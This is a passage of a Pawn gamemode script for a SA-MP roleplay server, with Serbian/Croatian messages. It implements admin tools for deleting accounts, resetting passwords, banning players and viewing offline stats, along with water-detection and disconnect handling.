        if( property_id_1 != -1 && strcmp( imeigraca, II[ property_id_1 ][ iOwner ], true) == 0)
		{
		    II[ property_id_1 ][ iOwned ] = 0;
		    II[ property_id_1 ][ iOnAuction ] = true;
		    II[ property_id_1 ][ iNeaktivnost ] = 0;
		    II[ property_id_1 ][ iOwnerSQLID ] = -1;
		    strmid( II[ property_id_1 ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
			PropertyRefresh( property_id_1 );
			SaveProperty( property_id_1 );
			SendInfoMessage( playerid, "Imovina ID: %d je prodata na buy igracu %s, zbog brisanja naloga.", property_id_1, imeigraca );
		}
		if( property_id_2 != -1 && strcmp( imeigraca, II[ property_id_2 ][ iOwner ], true) == 0)
		{
		    II[ property_id_2 ][ iOwned ] = 0;
		    II[ property_id_2 ][ iOnAuction ] = true;
		    II[ property_id_2 ][ iNeaktivnost ] = 0;
		    II[ property_id_2 ][ iOwnerSQLID ] = -1;
		    strmid( II[ property_id_2 ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
			PropertyRefresh( property_id_2 );
			SaveProperty( property_id_2 );
			SendInfoMessage( playerid, "Imovina ID: %d je prodata na buy igracu %s, zbog brisanja naloga.", property_id_2, imeigraca );
		}
		if( property_id_3 != -1 && strcmp( imeigraca, II[ property_id_3 ][ iOwner ], true) == 0)
		{
		    II[ property_id_3 ][ iOwned ] = 0;
		    II[ property_id_3 ][ iOnAuction ] = true;
		    II[ property_id_3 ][ iNeaktivnost ] = 0;
		    II[ property_id_3 ][ iOwnerSQLID ] = -1;
		    strmid( II[ property_id_3 ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
			PropertyRefresh( property_id_3 );
			SaveProperty( property_id_3 );
			SendInfoMessage( playerid, "Imovina ID: %d je prodata na buy igracu %s, zbog brisanja naloga.", property_id_3, imeigraca );
		}

		if( bussines_id != 0 )
		{
			foreach(new i : iter_Bizz)
			{
				if( bussines_id == BusinessInfo[ i ][ b_ID ] )
				{
				    if( i != -1 && strcmp( imeigraca, BusinessInfo[ i ][ bOwner ], true) == 0)
					{
			            BusinessInfo[ i ][ bOwner_sqlID ] = -1;
			            BusinessInfo[ i ][ bOnAuction ] = true;
						BusinessInfo[ i ][ bNeaktivnost ] = 0;
						BusinessInfo[ i ][ bFacture ] = 100;
				    	strmid( BusinessInfo[ i ][ bOwner ], "Drzava", 0, strlen( "Drzava" ), 32);
						Bussines_Refresh( i );

						new q[ 256 ];
						mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `b_owner_sqlID` = '%d', `bOnAuction` = '1', `bOwner` = '%s', `b_neaktivnost` = '%d', `b_facture` = '%d' WHERE `bussines_id` = '%d'",
							BusinessInfo[ i ][ bOwner_sqlID ],
							BusinessInfo[ i ][ bOwner ],
							BusinessInfo[ i ][ bNeaktivnost ],
							BusinessInfo[ i ][ bFacture ],
							BusinessInfo[ i ][ b_ID ] );

				   		mysql_tquery( mSQL, q );
						SendInfoMessage( playerid, "Firma ID: %d je prodata na buy igracu %s, zbog brisanja naloga.", i, imeigraca );
				   		break;
					}
				}
			}
		}

        new query[ 256 ];
		mysql_format( mSQL, query, sizeof(query), 
													"SELECT users.user_id, users.email, users.vehicle_slots, IFNULL(vehicles.veh_id, 0) AS `veh_id`, IFNULL(vehicles.v_model, 0) AS `v_model` FROM users \
														LEFT JOIN vehicles ON users.user_id = vehicles.owner_sqlID \
														WHERE users.p_name = '%e'", imeigraca );

		mysql_tquery( mSQL, query, "CheckPlayerRemoveVehAcc", "is", playerid, imeigraca );

    }
    return 1;
}

_:public CheckPlayerRemoveVehAcc( playerid, imeigraca[] )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows )
	{
        SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka.");
    }
    else
	{
        new user_id = cache_get_field_content_int( 0, "user_id" );

        new mail_e[ 50 ];
		cache_get_field_content( 0, "email", mail_e, mSQL, 50 );

		new veh_id, veh_model;
		for( new i = 0; i < rows; i ++ ) 
		{
            veh_id = cache_get_field_content_int( i, "veh_id" );
            veh_model = cache_get_field_content_int( i, "v_model" );

			if( veh_id > 0 && veh_model >= 400)
			{
	            sql_vehicles_delete(veh_id);
				SendInfoMessage( playerid, "Vozilo %s ID u bazi: %d je izbrisano iz baze igracu %s, zbog brisanja naloga.", GetVehicleNameEx( veh_model ), veh_id, imeigraca );
			}
		}
		new query[ 128 ];
		mysql_format( mSQL, query, sizeof( query ), "DELETE FROM `users` WHERE `user_id` = '%d' LIMIT 1", user_id );
		mysql_tquery( mSQL, query );

		AdminMsg( ADM_WARN,  "[ADMIN] %s je obrisao account %s.", ImeIgraca( playerid ), imeigraca );

		WriteLog("log-deleteacc", "Igracu %s je obrisan nalog od admina %s", imeigraca, ImeIgraca( playerid ));
	}
	return 1;
}

_:public CheckPlayerRemoveStats( playerid, vrsta, const imeigraca[] )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows )
    {
        SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
    }
    else 
    {
        new user_id = cache_get_field_content_int( 0, "user_id" );

	    new q[ 128 ];
		switch( vrsta )
		{
	        case 1:
			{
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `property_id_1` = '-1' WHERE `user_id` = '%d' LIMIT 1", user_id );
    			mysql_tquery( mSQL, q );

		    	SCMF( playerid, 0xFF6347FF, "#REMOVESTATS: Maknuli ste offline korisniku %s imovinu 1 sa statsa.", imeigraca );

				WriteLog("log-stats", "Admin %s je maknuo sa statsa imovinu 1 igracu %s", ImeIgraca( playerid ), imeigraca);
			}
			case 2:
			{
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `property_id_2` = '-1' WHERE `user_id` = '%d' LIMIT 1", user_id );
    			mysql_tquery( mSQL, q );

		    	SCMF( playerid, 0xFF6347FF, "#REMOVESTATS: Maknuli ste offline korisniku %s imovinu 2 sa statsa.", imeigraca );

				WriteLog("log-stats", "Admin %s je maknuo sa statsa imovinu 2 igracu %s", ImeIgraca( playerid ), imeigraca);
			}
			case 3:
			{
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `property_id_3` = '-1' WHERE `user_id` = '%d' LIMIT 1", user_id );
    			mysql_tquery( mSQL, q );

		    	SCMF( playerid, 0xFF6347FF, "#REMOVESTATS: Maknuli ste offline korisniku %s imovinu 3 sa statsa.", imeigraca );

				WriteLog("log-stats", "Admin %s je maknuo sa statsa imovinu 3 igracu %s", ImeIgraca( playerid ), imeigraca);
			}
			case 4:
			{
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `bussines_id` = '0' WHERE `user_id` = '%d' LIMIT 1", user_id );
    			mysql_tquery( mSQL, q );

		    	SCMF( playerid, 0xFF6347FF, "#REMOVESTATS: Maknuli ste offline korisniku %s firmu sa statsa.", imeigraca );

				WriteLog("log-stats", "Admin %s je maknuo sa statsa firmu igracu %s", ImeIgraca( playerid ), imeigraca);
			}
		}
    }
    return 1;
}

_:public CheckPlayerChangePW( playerid, imeigraca[] )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows )
    {
        SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
    }
    else 
    {
        new 
        	user_id = cache_get_field_content_int( 0, "user_id" ),
        	novalozinka[ 32 ],
        	randombroj = 100000 + random(899999);

		format( novalozinka, sizeof( novalozinka ), "%d", randombroj );

		DodajWarnRed("~r~(AC): ~w~Igracu %s je ~r~promenjen password~w~! Admin: %s", imeigraca, ImeIgraca( playerid ));
		SCMF( playerid, ZUTA, "(ANTICHEAT): Igracu %s je dodjeljen novi pass: %s", imeigraca, novalozinka );
	    SCMF( playerid, ZUTA, "(ANTICHEAT): Igracu %s je server lozinku poslao na email.", imeigraca );

	    new hash_pass[ 65 ];
    	SHA256_PassHash( novalozinka, ImeIgraca( playerid ), hash_pass, sizeof hash_pass );

        new q[ 200 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `password` = '%e' WHERE `user_id` = '%d'", hash_pass, user_id );
    	mysql_tquery( mSQL, q );
    }
    return 1;
}

_:public deleteoffvehicle( playerid, const imeigraca[] )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows )
	{
        SendErrorMessage( playerid, "Izabrani igrac nema to vozilo u vlasnistvu!");
    }
    else
	{
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

        new veh_id = cache_get_field_content_int( 0, "veh_id" );
		new veh_model = cache_get_field_content_int( 0, "v_model" );

        new str[ 144 ];
        format( str, sizeof( str ), "{FFFFFF}Izabrano vozilo %s (SQLID: %d) je u vlasnistvu %s.\n", GetVehicleNameEx( veh_model ), veh_model, imeigraca );
        strcat( DialogStrgEx, str );
        strcat( DialogStrgEx, "Da li ste sigurni da zelite da izbrisete to vozilo?" );

		VehicleOffSaleVehID[ playerid ] = veh_id;

        ShowPlayerDialog( playerid, dialog_OFFSELLVEH, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "Da", "Ne" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

    }
    return 1;
}

_:public CheckPlayerOffVeh( playerid, imeigraca[] )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows )
    {
        SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
    }
    else {

        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

        new vehicle_slots	= 	cache_get_field_content_int( 0, "vehicle_slots");

        new veh_model, veh_id;

        new str[ 256 ];
        format( str, sizeof( str ), "{FFFFFF}Broj slotova: {4282C0}[%d/%d]\n\n\nSpisak vozila:", vehicle_slots, MAX_VEH_SLOT );
        strcat( DialogStrgEx, str );

        for( new i = 0; i < rows; i ++ )
        {
            veh_id = cache_get_field_content_int( i, "veh_id" );
            veh_model = cache_get_field_content_int( i, "v_model" );

			if( veh_id > 0 && veh_model >= 400 )
			{
	            format( str, sizeof( str ), "{FFFFFF}* Vozilo: {4282C0}[%d]\n    {FFFFFF}- {4282C0}Ime vozila: {FFFFFF}[%s]\n    - {4282C0}ID u bazi: {FFFFFF}[%d]\n",
					i+1,
					GetVehicleNameEx( veh_model ),
					veh_id );

				strcat( DialogStrgEx, str );
			}
		}

		format( globalstring, sizeof( globalstring ), "OFF VOZILA - %s", imeigraca );
		ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, globalstring, DialogStrgEx, "OK", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    }
    return 1;
}

_:public CheckPlayerOffRich_Z( playerid, imeigraca[] )
{
    new query[ 1024 ];
	mysql_format( mSQL, query, sizeof(query), 

			"SELECT users.money, users.xBRacun, users.property_id_1, users.property_id_2, users.property_id_3, users.bussines_id, \
				IFNULL(org_members.org_id, 0) AS `org_id`, IFNULL(banned.ban_id, 0) AS `ban_id`, banned.ban_reason FROM users \
			    LEFT JOIN org_members ON users.user_id = org_members.memb_sqlID \
                LEFT JOIN banned ON users.user_id = banned.user_id \
			    WHERE users.p_name = '%e' LIMIT 1", 

			    	query, imeigraca );

	mysql_tquery( mSQL, query, "CheckPlayerOffRich", "is", playerid, imeigraca );
    return 1;
}

_:public CheckPlayerOffRich( playerid, imeigraca[] )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows )
	{
        SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
    }
    else
	{
		new novac =  cache_get_field_content_int(0, "money");

		new fsqlID = cache_get_field_content_int(0, "bussines_id");

		new firma = -1;
        if( PlayerInfo[ playerid ][ xBussinesSqlID ] != 0 )
        {
			foreach(new i : iter_Bizz)
			{
				if( BusinessInfo[ i ][ b_ID ] == fsqlID && BusinessInfo[ i ][ b_ID ] > 0 )
				{
					firma = i;
					break;
				}
			}
		}

	    new property_1 = cache_get_field_content_int(0, "property_id_1");
	    new property_2 = cache_get_field_content_int(0, "property_id_2");
	    new property_3 = cache_get_field_content_int(0, "property_id_3");

	    new bank_money = cache_get_field_content_int(0, "xBRacun");

	    new user_ip[ 64 ];
		cache_get_field_content( 0, "user_ip", user_ip, mSQL, 64 );

        new osqlID 	= 	cache_get_field_content_int(0, "org_id");

        new OrgID = -1;
		for( new id = 1; id < MAX_ORG; id++)
		{
		    if( org_info[ id ][ oID ] == osqlID && org_info[ id ][ oID ] > 0 )
			{
		        OrgID = id;
		        break;
		    }
		}

        new ban_id 	= cache_get_field_content_int(0, "ban_id");
        
        new ban_reason[ 64 ], 
        	ban_string[ 5 ];

		if( ban_id > 0 )
		{
            ban_string = "Da";
            cache_get_field_content( 0, "ban_reason", ban_reason, mSQL, 64 );
	    }
	    else
		{
            ban_string = "Ne";
			ban_reason = "Prazno";
		}

		SCMF(playerid, 0x4282C0FF, "*** NOVAC IGRACA - %s ***", imeigraca);
		SCMF(playerid, 0xFFFFFFAA, "Novac: [$%s] | Banka: [$%s]", fNumber(novac), fNumber(bank_money));
		if( OrgID != -1 ) SCMF(playerid, 0xFFFFFFAA, "Novac u organizaciji [$%s] [%s]", fNumber(org_info[ OrgID ][ oSafeMoney ]), getOrgName( OrgID ));
		if( property_1 != -1 ) SCMF(playerid, 0xF0F0F0FF, "Novac u imovini 1 [$%s] ID:%d", fNumber(II[ property_1 ][ iMoney ]), property_1);
		if( property_2 != -1 ) SCMF(playerid, 0xF0F0F0FF, "Novac u imovini 1 [$%s] ID:%d", fNumber(II[ property_2 ][ iMoney ]), property_2);
		if( property_3 != -1 ) SCMF(playerid, 0xF0F0F0FF, "Novac u imovini 1 [$%s] ID:%d", fNumber(II[ property_3 ][ iMoney ]), property_3);
		if( firma != -1 ) SCMF(playerid, 0xF0F0F0FF, "Novac u firmi [$%s] ID:%d", fNumber(BusinessInfo[ firma ][ bMoney ]), firma);
		SCMF( playerid, 0xF0F0F0FF, "Banovan: %s | Razlog: %s", ban_string, ban_reason );
    }
    return 1;
}

_:public CheckPlayerOffStats( playerid, imeigraca[] )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows )
	{
        SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
    }
    else
	{
		new pol			    = 	cache_get_field_content_int(0, "sex");
		new godine			= 	cache_get_field_content_int(0, "age");
		new novac			= 	cache_get_field_content_int(0, "money");
		new level			= 	cache_get_field_content_int(0, "level");
		new exp			    = 	cache_get_field_content_int(0, "exp");

		new fsqlID = cache_get_field_content_int(0, "bussines_id");

		new firma = -1;
        if( PlayerInfo[ playerid ][ xBussinesSqlID ] != 0 )
		{
			foreach(new i : iter_Bizz)
			{
				if( BusinessInfo[ i ][ b_ID ] == fsqlID )
				{
					firma = i;
					break;
				}
			}
		}

		new posao				= 	cache_get_field_content_int(0, "job_id");

	    new property_1			= 	cache_get_field_content_int(0, "property_id_1");
	    new property_2			= 	cache_get_field_content_int(0, "property_id_2");
	    new property_3			= 	cache_get_field_content_int(0, "property_id_3");

	    new bank_money			= 	cache_get_field_content_int(0, "xBRacun");
	    new onlinesati			= 	cache_get_field_content_int(0, "xOnlineSati");
	    new admin_level			= 	cache_get_field_content_int(0, "admin_lvl");
	    new helper_level		= 	cache_get_field_content_int(0, "helper_level");
	    new warns				= 	cache_get_field_content_int(0, "warn");

		new mail_e[ 128 ];
		cache_get_field_content( 0, "email", mail_e, mSQL, 128 );

		new staff_min			= 	cache_get_field_content_int(0, "staff_min");

		new lastlogin[ 64 ];
		cache_get_field_content( 0, "last_login", lastlogin, mSQL, 64 );

        new regdate[ 64 ];
		cache_get_field_content( 0, "reg_date", regdate, mSQL, 64 );

	    new user_ip[ 64 ];
		cache_get_field_content( 0, "user_ip", user_ip, mSQL, 64 );

	    new rank 				= 	cache_get_field_content_int(0, "memb_rank");

        new osqlID = 0, OrgID = 0;

		osqlID 					= cache_get_field_content_int( 0, "org_id" );

		if( osqlID != 0  )
		{
			for( new id = 1; id < MAX_ORG; id++)
			{
				if( org_info[ id ][ oID ] == osqlID )
				{
					OrgID = id;
				 	break;
				}
			}
		}

        new ban_id 	= 		cache_get_field_content_int(0, "ban_id");
        new ban_reason[ 64 ] ,ban_string[ 5 ];

		if( ban_id > 0 )
		{
            ban_string = "Da";
            cache_get_field_content( 0, "ban_reason", ban_reason, mSQL, 64 );
	    }
	    else
		{
            ban_string = "Ne";
			ban_reason = "Prazno";
		}

        new pol_name[ 7 ];
		if( pol == 1 ) pol_name = "musko";
		else if( pol== 2 ) pol_name = "zensko";

		new nxtlevel = level+1,
		    expamount = nxtlevel*levelexp;

		SCMF(playerid, 0x4282C0FF, "*** %s (IP: %s) ***", imeigraca, user_ip);
		SCMF(playerid, 0xFFFFFFAA, "Pol [%s] | Level:[%s] | Sati Igranja:[%sh]", pol_name, fNumber(level), fNumber(onlinesati));
		SCMF(playerid, 0xFFFFFFAA, "Respekt:[%s/%s] | Novac: [$%s] | Banka: [$%s]", fNumber(exp), fNumber(expamount), fNumber(novac), fNumber(bank_money));
		SCMF(playerid, 0xFFFFFFAA, "Upozorenja: [%d/3] | Posao: [%s]", warns, getJobName( posao ));
		SCMF(playerid, 0xFFFFFFAA, "Godine: [%d] | Organizacija: [%s] | Rank: [%d]", godine, getOrgName( OrgID ), rank);
		SCMF(playerid, 0xF0F0F0FF, "Kljuc Imovine1 [%d] | Kljuc Imovine2 [%d] | Kljuc Imovine3 [%d]", property_1, property_2, property_3);
		SCMF(playerid, 0xF0F0F0FF, "Kljuc Firme [%d]", firma);
		SCMF(playerid, 0xF0F0F0FF, "Admin [%d] | Gamemaster [%d]", admin_level, helper_level );
		SCMF(playerid, 0xF0F0F0FF, "Aktivnost igraca u staff timu: %s minuta", fNumber(staff_min));
		SCMF(playerid, 0xF0F0F0FF, "Banovan: %s | Razlog: %s", ban_string, ban_reason );
		SCMF(playerid, 0xF0F0F0FF, "Zadnja aktivnost: %s | Datum registracije: %s", lastlogin, regdate );
		SendClientMessage(playerid, 0xF0F0F0FF, "Da proverite vozila offline igraca: /(opv)offplayerveh." );
    }
    return 1;
}

_:public CheckPlayerOffOrgKick( type, OrgID, playerid, const imeigraca[] )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows )
	{
        SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
    }
    else
	{
        new user_id = cache_get_field_content_int( 0, "user_id" );

        new done = 0;
		for( new i = 0; i < org_info[ OrgID ][ oMaxClanova ]+2; i++ )
		{
			if( strcmp( imeigraca, org_members_info[ OrgID ][ i ][ o_m_Name ], true ) == 0 )
			{
			    strmid( org_members_info[ OrgID ][ i ][ o_m_Name ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
			    org_members_info[ OrgID ][ i ][ o_m_sqlID ] = 0;
			    org_members_info[ OrgID ][ i ][ o_m_type ] = 0;
			    done = 1;
			    break;
			}
		}
		if( done == 0 ) return SendErrorMessage( playerid, "ID organizacije i Ime_Prezime lidera se ne poklapa." );

        if( type == 0 ) org_info[ OrgID ][ oUbacenihClanova ]--;
        sql_org_member_delete( org_info[ OrgID ][ oID ], user_id );

		new q[ 256 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `skin_id` = '%d', `spawn` = '0', `org_contract` = '0', `org_punishment` = '0' WHERE `user_id` = '%d'", MALE_SKIN, user_id );
	    mysql_tquery( mSQL, q );

		if(type == 0)
		{
			SendInfoMessage( playerid, "Izbacili ste igraca %s iz organizacije %s", imeigraca, org_info[ OrgID ][ oName ] );
		}
		else if( type == 1 )
		{
			SendInfoMessage( playerid, "Izbacili ste lidera %s iz organizacije %s", imeigraca, org_info[ OrgID ][ oName ] );
		}
    }
    return 1;
}

_:public CheckPlayerOffBan( const reason[], playerid, const imeigraca[] )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows )
    {
        SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
    }
    else 
    {
        new user_id = cache_get_field_content_int( 0, "user_id" );

        PlayerInfo[ playerid ][ xAGMStats ]++;
	    sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );
		ServerInfo[ BanovanihKorisnika ]++;

		sql_ban_user( imeigraca, user_id, 1, reason, ImeIgraca( playerid ) ); 

		AdminMsg( ADM_WARN, "[ADMIN] %s je offbanovao igraca %s, razlog: %s.", ImeIgraca( playerid ), imeigraca, reason );
		WriteLog("log-ban", "Admin %s je offbanovao igraca %s | Razlog: %s", ImeIgraca( playerid ), imeigraca, reason);
    }
    return 1;
}

_:public CheckPlayerBan( playerid )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows )
	{
        InterpolatePogledLogin(playerid);
        SetPlayerTimerEx(playerid, "Login", 5000, false, "i", playerid);
    }
    else
	{
        new user_id, ban_type;
		user_id = cache_get_field_content_int( 0, "user_id" );
		ban_type = cache_get_field_content_int( 0, "ban_type" );

		if( ban_type == 1 )
		{
		    new ban_reason[ 64 ], ban_date[ 64 ], ban_admin[ MAX_PLAYER_NAME ];
		    cache_get_field_content( 0, "ban_reason", ban_reason, mSQL, 150 );
		    cache_get_field_content( 0, "ban_date", ban_date, mSQL, 150 );
		    cache_get_field_content( 0, "ban_admin", ban_admin, mSQL, 150 );

  			if( user_id == PlayerInfo[ playerid ][ xID ] )
			{
				SCMF( playerid, -1, "%s, banovani ste sa ovog servera.", ImeIgraca( playerid ) );
				SendClientMessage( playerid, -1, "Vas ban {4282C0}nece isteci." );
				SCMF( playerid, -1, "Vreme i datum bana: {4282C0}%s.", ban_date );
				SCMF( playerid, -1, "Razlog bana: {4282C0}%s.", ban_reason );
				SCMF( playerid, -1, "Admin koji vas je banovao: {4282C0}%s.", ban_admin );
				SendClientMessage( playerid, -1, "Ukoliko mislis da je ovo greska.");
				SendClientMessage( playerid, -1, "Zahtev za unban mozes traziti na {4282C0}forumu.");
				SendClientMessage( playerid, -1, "Forum: {4282C0}"SERVER_WEB"");

			    SetPlayerTimerEx(playerid, "KickIgraca", 50, false, "i", playerid);
				return 1;
			}
			else
			{
                InterpolatePogledLogin(playerid);
				SetPlayerTimerEx(playerid, "Login", 5000, false, "i", playerid);
			}
		}
		else if( ban_type == 2 )
		{
			new ban_reason[ 64 ], ban_date[ 64 ], ban_admin[ MAX_PLAYER_NAME ];
		    cache_get_field_content( 0, "ban_reason", ban_reason, mSQL, 150 );
		    cache_get_field_content( 0, "ban_date", ban_date, mSQL, 150 );
		    cache_get_field_content( 0, "ban_admin", ban_admin, mSQL, 150 );
		    new ban_time = cache_get_field_content_int( 0, "ban_time" );

			if( ban_time > 0 )
			{
                new datetime[ 6 ];
        		TimestampToDate( ban_time, datetime[ 0 ], datetime[ 1 ], datetime[ 2 ], datetime[ 3 ], datetime[ 4 ], datetime[ 5 ], 1 );

				if( gettime( ) < ban_time )
				{
					SCMF( playerid, 0x4282C0FF, "%s, {FFFFFF}banovan si sa ovog servera.", ImeIgraca( playerid ) );
					SCMF( playerid, -1, "Vas ban istice: {4282C0}%02d/%02d/%d - %d/%d/%d{FFFFFF}.",  datetime[ 2 ], datetime[ 1 ], datetime[ 0 ], datetime[ 3 ], datetime[ 4 ], datetime[ 5 ] );
					SCMF( playerid, -1, "Vreme i datum bana: {4282C0}%s.", ban_date );
					SCMF( playerid, -1, "Razlog bana: {4282C0}%s.", ban_reason );
					SCMF( playerid, -1, "Admin koji vas je banovao: {4282C0}%s.", ban_admin );
					SendClientMessage( playerid, -1, "Ukoliko mislis da je ovo greska.");
					SendClientMessage( playerid, -1, "Zahtev za unban mozes traziti na {4282C0}forumu.");
					SendClientMessage( playerid, -1, "Forum: {4282C0}"SERVER_WEB"");

					SetPlayerTimerEx(playerid, "KickIgraca", 50, false, "i", playerid);
					return 1;
				}
				else
				{
				    sql_user_unban( PlayerInfo[ playerid ][ xID ] );
				    InterpolatePogledLogin(playerid);
     				SetPlayerTimerEx(playerid, "Login", 5000, false, "i", playerid);
				}
			}
			else
			{
			    sql_user_unban( PlayerInfo[ playerid ][ xID ] );
			    InterpolatePogledLogin(playerid);
    			SetPlayerTimerEx(playerid, "Login", 5000, false, "i", playerid);
			}
		}
    }
    return 1;
}

stock IsPlayerInArea(playerid, Float:MinX, Float:MinY, Float:MaxX, Float:MaxY)
{
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid, X, Y, Z);

	if(X >= MinX && X <= MaxX && Y >= MinY && Y <= MaxY) 
	{
		return 1;
	}
	return 0;
}

stock IsPlayerInWaterLocation(playerid)
{
	new Float:null[2], Float:MaxZ;
	GetPlayerPos(playerid, null[0], null[1], MaxZ);
                
	if(IsPlayerInArea(playerid, 2044.6, 1206.358, 2192.984, 1376.552) && MaxZ < 0xA) return 1;
	else if(IsPlayerInArea(playerid, 2048.504, 1063.239, 2185.174, 1202.49) && MaxZ < 0xA) return 1;
	else if(IsPlayerInArea(playerid, 2204.698, 1426.837, 2204.698, 1430.705) && MaxZ < 0xA) return 1;
	else if(IsPlayerInArea(playerid, 2032.885, 1852.325, 2114.887, 1991.575) && MaxZ < 0xC) return 1;
	else if(IsPlayerInArea(playerid, 2517.086, 2316.493, 2606.897, 2420.93) && MaxZ < 0x16) return 1;
 	else if(IsPlayerInArea(playerid, 2554.5996, 1548.6178, 2507.7683, 1588.9154) && MaxZ < 0xF) return 1;
	else if(IsPlayerInArea(playerid, -2043.628, -980.9415, -1973.561, -724.0283) && MaxZ < 0x20) return 1;
	else if(IsPlayerInArea(playerid, -2753.912, -522.3632, -2665.071, -380.3444) && MaxZ < 0x05) return 1;
	else if(IsPlayerInArea(playerid, 1219.864, -2435.881, 1292.118, -2325.344) && MaxZ < 0xF) return 1;
	else if(IsPlayerInArea(playerid, 1923.388, -1223.924, 2010.854, -1168.656) && MaxZ < 0x16) return 1;
	else if(IsPlayerInArea(playerid, 1269.301, -837.0452, 1314.935, -781.7769) && MaxZ < 0x5A) return 1;
	else if(IsPlayerInArea(playerid, 1087.3953, -682.6734, 1102.3138, -663.0043) && MaxZ < 0x71) return 1;
	else if(IsPlayerInArea(playerid, 1268.6118, -784.2910, 1291.8774, -764.6104) && MaxZ < 0x43D) return 1;
	else if(MaxZ < 0xF) return 1;
	return 0;
}

stock IsPlayerUsingSwimAnim(playerid)
{
	if(IsPlayerInAnyVehicle(playerid) || GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return 0;
                
	new animlib[32], animname[32];
    GetAnimationName(GetPlayerAnimationIndex(playerid), animlib, 32, animname, 32);

	if(!strcmp(animlib, "SWIM", true) && !strcmp(animname, "SWIM_GLIDE", true)) return 1;
	else if(!strcmp(animlib, "SWIM", true) && !strcmp(animname, "SWIM_BREAST", true)) return 1;
	else if(!strcmp(animlib, "SWIM", true) && !strcmp(animname, "SWIM_CRAWL", true)) return 1;
	else if(!strcmp(animlib, "SWIM", true) && !strcmp(animname, "SWIM_DIVE_UNDER", true)) return 1;
 	else if(!strcmp(animlib, "SWIM", true) && !strcmp(animname, "SWIM_DIVE_GLIDE", true)) return 1;
	else if(!strcmp(animlib, "SWIM", true) && !strcmp(animname, "SWIM_UNDER", true)) return 1;
	else if(!strcmp(animlib, "SWIM", true) && !strcmp(animname, "SWIM_TREAD", true)) return 1;
	return 0;
}

stock IsPlayerInWater(playerid)
{
	if(IsPlayerInWaterLocation(playerid) && IsPlayerUsingSwimAnim(playerid)) return 1;
	return 0;
}

public OnPlayerDisconnect( playerid, reason )
{
    if( IsValidDynamicMapIcon( PlayerGpsRadar[ playerid ][ _pgrIconId ] ) ) DestroyDynamicMapIcon( PlayerGpsRadar[ playerid ][ _pgrIconId ] );
    if( IsValidDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] ) ) DestroyDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] );
	if( IsValidDynamicCP( PlayerGpsRadar[ playerid ][ _pgrCheckPointId ] ) ) DestroyDynamicCP( PlayerGpsRadar[ playerid ][ _pgrCheckPointId ] );

    new q[ 128 ], km, mm, sqlID;
    for( new j = 0; j < MAX_VEH_SLOT; j ++ )
	{
		if( (j+1) <= PlayerInfo[ playerid ][ xSlotoviVozila ] && player_veh[ playerid ][ vehicle_id ][ j ] != -1 )
		{
			new vehicleid = player_veh[ playerid ][ vehicle_id ][ j ];
			if( vehicleid != -1 )
			{
			    km = VehicleInfo[ vehicleid ][ vKilometri ];
			    mm = VehicleInfo[ vehicleid ][ vMetri ];
				sqlID = VehicleInfo[ vehicleid ][ vSqlID ];

				mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_kilometri` = '%d', `v_metri` = '%d' WHERE `veh_id` = '%d' LIMIT 1", km, mm, sqlID );
				mysql_tquery( mSQL, q );

				ResetVehicle( vehicleid );
				SMG_DestroyVehicle( vehicleid );
			}
		}
	}

	if(IsValidPlayerObject(playerid, MunicijaObject[playerid])) DestroyPlayerObject(playerid, MunicijaObject[playerid]);
	if(IsValidPlayerObject(playerid, NamjestajObject[playerid])) DestroyPlayerObject(playerid, NamjestajObject[playerid]);

    if( IgracNosiPaket[ playerid ] && ( GetFactionType( playerid ) == ORG_TIP_MAFIJA || GetFactionType( playerid ) == ORG_TIP_BANDA ) )
    {
		new OrgID = PlayerInfo[ playerid ][ xClan ];

		SMG_DisablePlayerCheckpoint( playerid );
		CheckpointStatus[ playerid ] = 0;

		RemovePlayerAttachedObject( playerid, OBJECT_SLOT_MAIN );

		IgracNosiPaket[ playerid ] = false;

    	ServerInfo[ PaketNijeNaSvomMestu ] = true;

		GetPlayerPos( playerid, PaketNewPos[0], PaketNewPos[1], PaketNewPos[2] );

        if( IsValidDynamicObject( ServerInfo[ PaketObject ] ) ) DestroyDynamicObject( ServerInfo[ PaketObject ] );

